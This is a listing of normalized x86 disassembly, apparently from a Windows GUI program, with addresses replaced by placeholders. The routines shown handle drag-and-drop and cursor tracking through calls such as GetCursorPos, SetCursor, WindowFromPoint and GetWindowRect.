jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4456d0
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_43b2c4
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_43b2c4
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_43cfc8
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_43b2c4
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b324
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_44568c
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_43b300
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403320
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_4457b8
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_4456d0
jmp r-xdata
mov eax [ rw-data ]
call sub_44582c
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b324
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_43cfc8
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403320
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403320
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407bec
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_43b664
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_43a890
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4456d0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_43b394
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_43b7d4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_43b979
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403320
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403320
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43ab98
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43b664
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43aa80
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_443c60
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412cac
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_43cf9c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_412cac
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_43b998
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403320
mov ebx eax
sub_43ba0c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_43bcd8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_43bc66
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_43a8d8
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032d4
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_43b998
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_43b2c4
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_44582c
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bc6d
mov eax [ rw-data ]
call sub_403124
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_454618
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_43e62c
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_43b190
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_458284
sub_43bc6d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403124
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4032b0
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
sub_43bcfc
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43a310
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43bd30
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_43bcfc
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_43cfc8
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_44154c
test eax eax
je r-xdata
mov esi eax
sub_43bd78
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_413fac
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx ] eax
sub_43bda0
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_4142a4
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403124
xor eax eax
mov [ ebx ] eax
sub_43bdc0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43bdf0
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_4144cc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43bea0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414530
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_43be79
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_43c02c
call sub_40395c
call sub_40395c
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_414108
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41ec30
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_43beac
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4144cc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43bf4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bf51
mov eax [ rw-data ]
call sub_414530
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43bf22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43c02c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41ec8c
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_414108
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41ec30
test al al
je r-xdata
sub_43bf58
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax esi
call sub_43c02c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e860
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_43bf84
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ee10
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41ee14
mov eax [ ebp - 0x4 ]
call sub_43c078
mov eax [ rw-data ]
call sub_4144cc
mov ebx eax
xor eax eax
push ebp
push sub_43c009
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413fac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414530
retn
call sub_43bdf0
sub_43c02c
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41ee14
mov edx ebx
mov eax [ rw-data ]
call sub_4144e0
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_43c078
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43dabc
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_43c0a4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f4
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_43c0e0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414800
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_43c128
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_43c1e4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c2b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c2b8
lea eax [ ebp - 0x1c ]
call sub_403ef8
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403320
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_44cd94
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403f4c
sub_43c2d4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43c33b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4499a8
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_43d484
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov edx [ eax + 0x64 ]
pop eax
call sub_404304
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c342
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov al 0x1
sub_43c348
push ebx
mov ebx eax
mov eax ebx
call sub_4499d0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43c37c
push ebx
mov ebx eax
mov eax ebx
call sub_449a20
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404304
je r-xdata
mov al 0x1
pop ebx
retn
sub_43c3b4
push ebx
mov ebx eax
mov eax ebx
call sub_449a5c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43c3e8
push ebx
mov ebx eax
mov eax ebx
call sub_41b36c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43c410
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43d4b4
sub_43c430
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_43c450
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403f4c
sub_43c474
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_43d3a4
sub_43c494
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_43c4c0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404304
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_43c524
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43ce00
sub_43c544
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43cdec
sub_43c564
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
